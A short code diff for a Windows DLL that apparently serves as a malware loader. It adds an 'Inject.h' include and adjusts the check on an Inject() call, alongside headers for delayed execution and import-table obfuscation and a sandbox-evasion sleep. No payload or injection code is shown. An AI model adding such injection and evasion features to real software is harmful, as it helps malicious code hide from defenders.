@@ -1,16 +1,18 @@
 #include <Windows.h>
 #include "DelayExec.h"
 #include "ObfuscateIAT.h"
+#include "Inject.h"
 
 extern __declspec(dllexport) int EntryPoint() 
 {
     Wait(TRUE);
 
-    if (!Inject())
+    if (Inject() == NULL)
     {
         SharedUserDataSleep(5000);
         return 0;
     }
+
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
